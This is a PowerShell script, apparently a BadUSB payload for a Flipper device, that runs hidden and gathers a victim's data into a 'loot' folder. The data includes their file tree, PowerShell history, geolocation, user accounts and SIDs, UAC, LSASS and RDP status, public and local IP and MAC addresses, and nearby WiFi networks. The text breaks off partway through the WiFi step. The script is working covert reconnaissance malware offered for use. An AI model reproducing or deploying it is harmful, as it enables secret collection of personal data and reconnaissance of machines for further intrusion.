<#
.SYNOPSIS
    ADV-Recon Stealth v7 — Invisivel + janela discreta (corrigida)
    Recon 100% oculto. Ao terminar, lanca janela minuscula visivel com "15".
    Aguarda 15s pelo Flipper. Mostra OK/NO. Cleanup total.
#>

############################################################################################################################################################
# LOG INTERNO
############################################################################################################################################################

$Global:Log = @()
function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}

L 'ADV-Recon Stealth v7 iniciado'
L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)

############################################################################################################################################################
# CONFIG
############################################################################################################################################################

$Timeout   = 15
$OutFolder = 'loot'
$Marker    = 'badusb'
$IgnoreIDs = @('C:', 'D:')
$IgnoreVOL = @('Google Drive', 'EVO')

$Fn  = $env:USERNAME + '-LOOT-' + (Get-Date -f 'yyyy-MM-dd_HH-mm')
$Zip = $Fn + '.zip'
$WD  = $env:TEMP + '\' + $Fn
$ZP  = $env:TEMP + '\' + $Zip

mkdir $WD -Force | Out-Null

############################################################################################################################################################
# RECON
############################################################################################################################################################
L 'ETAPA 1: Tree'
try {
    cmd /c 'tree %USERPROFILE% /a /f' 2>$null | Out-File ($WD + '\tree.txt') -Encoding UTF8
    $tsz = (gi ($WD + '\tree.txt')).Length
    if ($tsz -lt 50) {
        cmd /c 'dir %USERPROFILE% /s /b' 2>$null | Out-File ($WD + '\tree.txt') -Encoding UTF8
    }
    L ('OK: Tree (' + $tsz + ' bytes)')
} catch { L 'FAIL: Tree' }

L 'ETAPA 2: PS History'
try {
    $src = $env:APPDATA + '\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
    cp $src ($WD + '\pshist.txt') -ea 0
    L 'OK: PS History'
} catch { L 'FAIL: PS History' }

L 'ETAPA 3: User data'
try { $ufn = (Get-LocalUser $env:USERNAME).FullName } catch { $ufn = $env:USERNAME }
try { $uem = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName } catch { $uem = 'N/D' }
try {
    Add-Type -AssemblyName System.Device
    $geo = New-Object System.Device.Location.GeoCoordinateWatcher
    $geo.Start()
    while ($geo.Status -ne 'Ready' -and $geo.Permission -ne 'Denied') { Sleep -m 50 }
    if ($geo.Permission -eq 'Denied') { $la = 'N/D'; $lo = 'N/D'; $gs = 'Denied' }
    else { $la = $geo.Position.Location.Latitude; $lo = $geo.Position.Location.Longitude; $gs = 'OK' }
    L 'OK: Geo'
} catch { $la = 'N/D'; $lo = 'N/D'; $gs = 'Err'; L 'FAIL: Geo' }

L 'ETAPA 4: Local users'
try { $lu = Get-WmiObject Win32_UserAccount | ft Caption, Domain, Name, FullName, SID | Out-String; L 'OK: Users' } catch { $lu = 'Err'; L 'FAIL: Users' }

L 'ETAPA 5: UAC/LSASS/RDP'
try {
    $rk = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    $c  = (gp $rk).ConsentPromptBehaviorAdmin
    $p  = (gp $rk).PromptOnSecureDesktop
    if ($c -eq 0 -and $p -eq 0) { $ua = 'Never' }
    elseif ($c -eq 5 -and $p -eq 0) { $ua = 'Notify(no dim)' }
    elseif ($c -eq 5 -and $p -eq 1) { $ua = 'Notify(default)' }
    elseif ($c -eq 2 -and $p -eq 1) { $ua = 'Always' }
    else { $ua = 'Unknown' }
} catch { $ua = 'Err' }
try { $ls = Get-Process lsass -ea Stop; if ($ls.ProtectedProcess) { $lst = 'PPL' } else { $lst = 'No PPL' } } catch { $lst = 'N/F' }
try {
    $tsk = 'hklm:\System\CurrentControlSet\Control\Terminal Server'
    if ((gp $tsk).fDenyTSConnections -eq 0) { $rd = 'On' } else { $rd = 'Off' }
} catch { $rd = 'Err' }
L 'OK: UAC/LSASS/RDP'

L 'ETAPA 6: Network'
try { $pu = (iwr ipinfo.io/ip -UseBasicParsing -TimeoutSec 3).Content.Trim() } catch { $pu = 'Err' }
try {
    $lip = Get-NetIPAddress -IfAlias '*Ethernet*', '*Wi-Fi*' -AddrFam IPv4 -ea 0
    $lip = $lip | Select IfAlias, IPAddress, PrefixOrigin | Out-String
} catch { $lip = 'Err' }
try {
    $mc = Get-NetAdapter -Name '*Ethernet*', '*Wi-Fi*' -ea 0
    $mc = $mc | Select Name, MacAddress, Status | Out-String
} catch { $mc = 'Err' }
L 'OK: Network'

L 'ETAPA 7: WiFi'
try {
    $nwRaw = netsh wlan show networks mode=Bssid 2>$null
    $nwLines = $nwRaw | Where-Object { $_ -like 'SSID*' -or $_ -like '*Authentication*' -or $_ -like '*Encryption*' }
    $nw = $nwLines -join "`n"
    if (!$nw) { $nw = 'None' }
    L 'OK: Nearby WiFi'
} catch { $nw = 'Err';